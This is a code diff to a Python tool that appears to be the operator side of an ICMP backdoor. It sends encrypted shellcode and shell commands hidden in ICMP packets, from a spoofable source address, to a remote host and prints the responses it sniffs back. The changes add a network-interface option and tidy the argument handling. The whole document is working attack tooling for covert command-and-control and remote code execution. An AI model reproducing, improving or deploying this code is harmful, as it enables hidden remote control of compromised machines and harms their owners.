@@ -3,6 +3,16 @@ import _thread
 import getopt
 import struct
 
+MSG_TYPE_SHELLCODE = '\x01'
+MSG_TYPE_COMMAND = '\x02'
+MSG_TYPE_REMOTE_SHELLCODE = '\x03'
+
+magic = b"GOATSE"
+src_ip = ""
+dst_ip = ""
+shellcode_file = ""
+block_size = 128
+interface=None
 
 ########## functions ############
 def usage(err=None):
@@ -10,7 +20,8 @@ def usage(err=None):
         print("Error: {}\n".format(err))
 
     print("Usage:")
-    print("\tpython {} -d <dst_ip> [-s <src_ip>] [-f <shellcode_file>] [-h]".format(sys.argv[0]))
+    print("\tpython {} -d <dst_ip> -i <interface> [-s <src_ip>] [-f <shellcode_file>] [-h]".format(sys.argv[0]))
+    print("\t\tinterface: The interface that should be used for sending packets. (REQUIRED)")
     print("\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)")
     print("\t\tsrc_ip: the address we want to send from (Can be anything)")
     print("\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin")
@@ -18,11 +29,11 @@ def usage(err=None):
     sys.exit(0)
 
 def parse_args():
-   global dst_ip, src_ip, shellcode_file
+   global dst_ip, src_ip, shellcode_file, interface
 
    try:
-      opts, args = getopt.gnu_getopt(sys.argv[1:], 'd:s:f:h', \
-         ['destination=', 'source=', 'shellcode=', 'help'])
+      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:h', \
+         ['interface=', 'destination=', 'source=', 'shellcode=', 'help'])
 
    except getopt.GetoptError as err:
       usage(err)    
@@ -30,6 +41,8 @@ def parse_args():
    for o, a in opts:
       if o in ('-d', '--destination'):
          dst_ip = a
+      if o in ('-i', '--interface'):
+         interface = a
       if o in ('-s', '--source'):
          src_ip = a
       if o in ('-f', '--shellcode'):
@@ -83,7 +96,9 @@ def sniff_packet(pkt):
                     print(data[len(magic) + 3:].decode(), end='')
 
 def start_listener():
-   sniff(filter="icmp", prn=sniff_packet)
+    global interface
+
+    sniff(filter="icmp", prn=sniff_packet, iface=interface)
 
 def send_shellcode():
    global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, shellcode_file, last_packet
@@ -105,17 +120,6 @@ def send_shellcode():
    # Now send it
    send(build_pkt(src_ip, dst_ip, encrypted_data, key), verbose=0)
 
-########### main #############
-MSG_TYPE_SHELLCODE = '\x01'
-MSG_TYPE_COMMAND = '\x02'
-MSG_TYPE_REMOTE_SHELLCODE = '\x03'
-
-magic = b"GOATSE"
-src_ip = ""
-dst_ip = ""
-shellcode_file = ""
-block_size = 128
-
 # We need use rand for key generation
 random.seed()
 
@@ -123,11 +127,17 @@ random.seed()
 parse_args()
 
 # Make sure we at least have a destination
-if dst_ip == "":
+if not dst_ip:
    print("ERROR: Destination must be specified")
    usage()
    sys.exit(0)
    
+# Make sure we at least have a destination
+if not interface:
+   print("ERROR: Interface must be specified")
+   usage()
+   sys.exit(0)
+ 
 # Do we send shellcode or start a shell
 if shellcode_file != "":
 	send_shellcode()
@@ -142,4 +152,4 @@ while 1:
    line = sys.stdin.readline().rstrip('\n').encode()
    key = generate_key()
    encrypted_data = crypt_data(magic + b"\x02" + struct.pack('<H', len(line)) + line, key)
-   send(build_pkt(src_ip, dst_ip, key + encrypted_data), verbose=0)
+   send(build_pkt(src_ip, dst_ip, key + encrypted_data), verbose=0, iface=interface)
